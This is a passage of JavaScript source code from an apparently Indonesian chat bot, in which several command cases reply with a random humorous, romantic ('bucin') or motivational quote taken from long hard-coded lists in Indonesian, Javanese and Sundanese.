'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.',
'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.',
'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.',
'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.',
'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.',
'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.',
'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.',
'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.',
'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.',
'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.',
'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.',
'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.',
'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.',
'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.',
'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.',
'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.',
'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!',
'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.',
'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.',
'Statusnya rohani, kelakuannya rohalus.',
'Kegagalan bukan suatu keberhasilan.',
'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.',
'Aku juga pernah kaya, waktu gajian.',
'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.',
'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.',
'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.',
'Jangan terlalu berharap! nanti jatuhnya sakit!',
'Ingat! Anda itu jomblo',
'Gak tau mau ngetik apa',
]
    let bacotan = pickRandom(bacot)
  reply(bacotan)
}
break
//=========================================\\======
case 'quotesbucin': {
const bucin = [
    "Aku memilih untuk sendiri, bukan karena menunggu yang sempurna, tetapi butuh yang tak pernah menyerah.",
    "Seorang yang single diciptakan bersama pasangan yang belum ditemukannya.",
    "Jomblo. Mungkin itu cara Tuhan untuk mengatakan 'Istirahatlah dari cinta yang salah'.",
    "Jomblo adalah anak muda yang mendahulukan pengembangan pribadinya untuk cinta yang lebih berkelas nantinya.",
    "Aku bukan mencari seseorang yang sempurna, tapi aku mencari orang yang menjadi sempurna berkat kelebihanku.",
    "Pacar orang adalah jodoh kita yang tertunda.",
    "Jomblo pasti berlalu. Semua ada saatnya, saat semua kesendirian menjadi sebuah kebersamaan dengannya kekasih halal. Bersabarlah.",
    "Romeo rela mati untuk juliet, Jack mati karena menyelamatkan Rose. Intinya, kalau tetap mau hidup, jadilah single.",
    "Aku mencari orang bukan dari kelebihannya tapi aku mencari orang dari ketulusan hatinya.",
    "Jodoh bukan sendal jepit, yang kerap tertukar. Jadi teruslah berada dalam perjuangan yang semestinya.",
    "Kalau kamu jadi senar gitar, aku nggak mau jadi gitarisnya. Karena aku nggak mau mutusin kamu.",
    "Bila mencintaimu adalah ilusi, maka izinkan aku berimajinasi selamanya.",
    "Sayang... Tugas aku hanya mencintaimu, bukan melawan takdir.",
    "Saat aku sedang bersamamu rasanya 1 jam hanya 1 detik, tetapi jika aku jauh darimu rasanya 1 hari menjadi 1 tahun.",
    "Kolak pisang tahu sumedang, walau jarak membentang cintaku takkan pernah hilang.",
    "Aku ingin menjadi satu-satunya, bukan salah satunya.",
    "Aku tidak bisa berjanji untuk menjadi yang baik. Tapi aku berjanji akan selalu mendampingi kamu.",
    "Kalau aku jadi wakil rakyat aku pasti gagal, gimana mau mikirin rakyat kalau yang selalu ada dipikiran aku hanyalah dirimu.",
    "Lihat kebunku, penuh dengan bunga. Lihat matamu, hatiku berbunga-bunga.",
    "Berjanjilah untuk terus bersamaku sekarang, esok, dan selamanya.",
    "Rindu tidak hanya muncul karena jarak yang terpisah. Tapi juga karena keinginan yang tidak terwujud.",
    "Kamu tidak akan pernah jauh dariku, kemanapun aku pergi kamu selalu ada, karena kamu selalu di hatiku, yang jauh hanya raga kita bukan hati kita.",
    "Aku tahu dalam setiap tatapanku, kita terhalang oleh jarak dan waktu. Tapi aku yakin kalau nanti kita pasti bisa bersatu.",
    "Merindukanmu tanpa pernah bertemu sama halnya dengan menciptakan lagu yang tak pernah ternyayikan.",
    "Ada kalanya jarak selalu menjadi penghalang antara aku sama kamu, namun tetap saja di hatiku kita selalu dekat.",
    "Jika hati ini tak mampu membendung segala kerinduan, apa daya tak ada yang bisa aku lakukan selain mendoakanmu.",
    "Mungkin di saat ini aku hanya bisa menahan kerinduan ini. Sampai tiba saatnya nanti aku bisa bertemu dan melepaskan kerinduan ini bersamamu.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Dalam dinginnya malam, tak kuingat lagi; Berapa sering aku memikirkanmu juga merindukanmu.",
    "Merindukanmu itu seperti hujan yang datang tiba-tiba dan bertahan lama. Dan bahkan setelah hujan reda, rinduku masih terasa.",
    "Sejak mengenalmu bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu.",
    "Tahu gak perbedaan pensi sama wajah kamu? Kalau pensil tulisannya bisa dihapus, tapi kalau wajah kamu gak akan ada yang bisa hapus dari pikiran aku.",
    "Bukan Ujian Nasional besok yang harus aku khawatirkan, tapi ujian hidup yang aku lalui setelah kamu meninggalkanku.",
    "Satu hal kebahagiaan di sekolah yang terus membuatku semangat adalah bisa melihat senyumanmu setiap hari.",
    "Kamu tahu gak perbedaanya kalau ke sekolah sama ke rumah kamu? Kalo ke sekolah pasti yang di bawa itu buku dan pulpen, tapi kalo ke rumah kamu, aku cukup membawa hati dan cinta.",
    "Aku gak sedih kok kalo besok hari senin, aku sedihnya kalau gak ketemu kamu.",
    "Momen cintaku tegak lurus dengan momen cintamu. Menjadikan cinta kita sebagai titik ekuilibrium yang sempurna.",
    "Aku rela ikut lomba lari keliling dunia, asalkan engkai yang menjadi garis finishnya.",
    "PR-ku adalah merindukanmu. Lebih kuat dari Matematika, lebih luas dari Fisika, lebih kerasa dari Biologi.",
    "Cintaku kepadamu itu bagaikan metabolisme, yang gak akan berhenti sampai mati.",
    "Kalau jelangkungnya kaya kamu, dateng aku jemput, pulang aku anter deh.",
    "Makan apapun aku suka asal sama kamu, termasuk makan ati.",
    "Cinta itu kaya hukuman mati. Kalau nggak ditembak, ya digantung.",
    "Mencintaimu itu kayak narkoba: sekali coba jadi candu, gak dicoba bikin penasaran, ditinggalin bikin sakaw.",
    "Gue paling suka ngemil karena ngemil itu enak. Apalagi ngemilikin kamu sepenuhnya...",
    "Dunia ini cuma milik kita berdua. Yang lainnya cuma ngontrak.",
    "Bagi aku, semua hari itu adalah hari Selasa. Selasa di Surga bila dekat denganmu...",
    "Bagaimana kalau kita berdua jadi komplotan penjahat? Aku curi hatimu dan kamu curi hatiku.",
    "Kamu itu seperti kopi yang aku seruput pagi ini. Pahit, tapi bikin nagih.",
    "Aku sering cemburu sama lipstikmu. Dia bisa nyium kamu tiap hari, dari pagi sampai malam.",
    "Hanya mendengar namamu saja sudah bisa membuatku tersenyum seperti orang bodoh.",
    "Aku tau teman wanitamu bukan hanya satu, dan menyukaimu pun bukan hanya aku.",
    "Semenjak aku berhenti berharap pada dirimu, aku jadi tidak semangat dalam segala hal..",
    "Denganmu, jatuh cinta adalah patah hati paling sengaja.",
    "Sangat sulit merasakan kebahagiaan hidup tanpa kehadiran kamu disisiku.",
    "Melalui rasa rindu yang bergejolak dalam hati, di situ terkadang aku sangat membutuhkan dekap peluk kasih sayangmu.",
    "Sendainya kamu tahu, sampai saat ini aku masih mencintaimu.",
    "Terkadang aku iri sama layangan..talinya putus saja masih dikejar kejar dan gak rela direbut orang lain...",
    "Aku tidak tahu apa itu cinta, sampai akhirnya aku bertemu denganmu. Tapi, saat itu juga aku tahu rasanya patah hati.",
    "Mengejar itu capek, tapi lebih capek lagi menunggu\nMenunggu kamu menyadari keberadaanku...",
    "Jangan berhenti mencinta hanya karena pernah terluka. Karena tak ada pelangi tanpa hujan, tak ada cinta sejati tanpa tangisan.",
    "Aku punya sejuta alasan unutk melupakanmu, tapi tak ada yang bisa memaksaku untuk berhenti mencintaimu.",
    "Terkadang seseorang terasa sangat bodoh hanya untuk mencintai seseorang.",
    "Kamu adalah patah hati terbaik yang gak pernah aku sesali.",
    "Bukannya tak pantas ditunggu, hanya saja sering memberi harapan palsu.",
    "Sebagian diriku merasa sakit, Mengingat dirinya yang sangat dekat, tapi tak tersentuh.",
    "Hal yang terbaik dalam mencintai seseorang adalah dengan diam-diam mendo akannya.",
    "Kuharap aku bisa menghilangkan perasaan ini secepat aku kehilanganmu.",
    "Demi cinta kita menipu diri sendiri. Berusaha kuat nyatanya jatuh secara tak terhormat.",
    "Anggaplah aku rumahmu, jika kamu pergi kamu mengerti kemana arah pulang. Menetaplah bila kamu mau dan pergilah jika kamu bosan...",
    "Aku bingung, apakah aku harus kecewa atu tidak? Jika aku kecewa, emang siapa diriku baginya?\n\nKalau aku tidak kecewa, tapi aku menunggu ucapannya.",
    "Rinduku seperti ranting yang tetap berdiri.Meski tak satupun lagi dedaunan yang menemani, sampai akhirnya mengering, patah, dan mati.",
    "Kurasa kita sekarang hanya dua orang asing yang memiliki kenangan yang sama.",
    "Buatlah aku bisa membencimu walau hanya beberapa menit, agar tidak terlalu berat untuk melupakanmu.",
    "Aku mencintaimu dengan segenap hatiku, tapi kau malah membagi perasaanmu dengan orang lain.",
    "Mencintaimu mungkin menghancurkanku, tapi entah bagaimana meninggalkanmu tidak memperbaikiku.",
    "Kamu adalah yang utama dan pertama dalam hidupku. Tapi, aku adalah yang kedua bagimu.",
    "Jika kita hanya bisa dipertemukan dalam mimpi, aku ingin tidur selamanya.",
    "Melihatmu bahagia adalah kebahagiaanku, walaupun bahagiamu tanpa bersamaku.",
    "Aku terkadang iri dengan sebuah benda. Tidak memiliki rasa namun selalu dibutuhkan. Berbeda dengan aku yang memiliki rasa, namun ditinggalkan dan diabaikan...",
    "Bagaimana mungkin aku berpindah jika hanya padamu hatiku bersinggah?",
    "Kenangan tentangmu sudah seperti rumah bagiku. Sehingga setiap kali pikiranku melayang, pasti ujung-ujungnya akan selalu kembali kepadamu.",
    "Kenapa tisue bermanfaat? Karena cinta tak pernah kemarau. - Sujiwo Tejo",
    "Kalau mencintaimu adalah kesalahan, yasudah, biar aku salah terus saja.",
    "Sejak kenal kamu, aku jadi pengen belajar terus deh. Belajar jadi yang terbaik buat kamu.",
    "Ada yang bertingkah bodoh hanya untuk melihatmu tersenyum. Dan dia merasa bahagia akan hal itu.",
    "Aku bukan orang baik, tapi akan belajar jadi yang terbaik untuk kamu.",
    "Kita tidak mati, tapi lukanya yang membuat kita tidak bisa berjalan seperti dulu lagi.",
    "keberadaanmu bagaikan secangkir kopi yang aku butuhkan setiap pagi, yang dapat mendorongku untuk tetap bersemangat menjalani hari.",
    "Aku mau banget ngasih dunia ke kamu. Tapi karena itu nggak mungkin, maka aku akan kasih hal yang paling penting dalam hidupku, yaitu duniaku.",
    "Mending sing humoris tapi manis, ketimbang sok romantis tapi akhire tragis.",
    "Ben akhire ora kecewa, dewe kudu ngerti kapan waktune berharap lan kapan kudu mandeg.",
    "Aku ki wong Jowo seng ora ngerti artine 'I Love U'. Tapi aku ngertine mek 'Aku tresno awakmu'.",
    "Ora perlu ayu lan sugihmu, aku cukup mok setiani wes seneng ra karuan.",
    "Cintaku nang awakmu iku koyok kamera, fokus nang awakmu tok liyane mah ngeblur.",
    "Saben dino kegowo ngimpi tapi ora biso nduweni.",
    "Ora ketemu koe 30 dino rasane koyo sewulan.",
    "Aku tanpamu bagaikan sego kucing ilang karete. Ambyar.",
    "Pengenku, Aku iso muter wektu. Supoyo aku iso nemokne kowe lewih gasik. Ben Lewih dowo wektuku kanggo urip bareng sliramu.",
    "Aku ora pernah ngerti opo kui tresno, kajaba sak bare ketemu karo sliramu.",
    "Cinta aa ka neng moal leungit-leungit sanajan aa geus kawin deui.",
    "Kasabaran kaula aya batasna, tapi cinta kaula ka anjeun henteu aya se epna.",
    "Kanyaah akang moal luntur najan make Bayclean.",
    "Kenangan endah keur babarengan jeung anjeun ek tuluy diinget-inget nepi ka poho.",
    "Kuring moal bakal tiasa hirup sorangan, butuh bantosan jalmi sejen.",
    "Nyaahna aa ka neg teh jiga tukang bank keur nagih hutang (hayoh mumuntil).",
    "Kasabaran urang aya batasna, tapi cinta urang ka maneh moal aya beakna.",
    "Hayang rasana kuring ngarangkai kabeh kata cinta anu aya di dunya ieu, terus bade ku kuring kumpulkeun, supaya anjeun nyaho gede pisan rasa cinta kuring ka anjeun.",
    "Tenang wae neng, ari cinta Akang mah sapertos tembang krispatih; Tak lekang oleh waktu.",
    "Abdi sanes jalmi nu sampurna pikeun anjeun, sareng sanes oge nu paling alus kanggo anjeun. Tapi nu pasti, abdi jalmi hiji-hijina nu terus emut ka anjeun.",
    "Cukup jaringan aja yang hilang, kamu jangan.",
    "Sering sih dibikin makan ati. Tapi menyadari kamu masih di sini bikin bahagia lagi.",
    "Musuhku adalah mereka yang ingin memilikimu juga.",
    "Banyak yang selalu ada, tapi kalo cuma kamu yang aku mau, gimana?",
    "Jam tidurku hancur dirusak rindu.",
    "Cukup China aja yang jauh, cinta kita jangan.",
    "Yang penting itu kebahagiaan kamu, aku sih gak penting..",
    "Cuma satu keinginanku, dicintai olehmu..",
    "Aku tanpamu bagaikan ambulans tanpa wiuw wiuw wiuw.",
    "Cukup antartika aja yang jauh. Antarkita jangan."
]
const ReinzIDtruth = bucin[Math.floor(Math.random() * bucin.length)]
	reply(`${ReinzIDtruth}`)
}
break

//=========================================\\======
case 'quotesmotivasi': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const motivasi = [
"ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
"ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
"ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
"ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
"ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
"ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
"ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
"ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
"ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
"ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
"ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
"ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
"ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
"ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
"ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
"ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
"ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
"ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
"ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
"ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
"ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
"ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
"20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
"ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
"ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
"ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
"ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
"ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
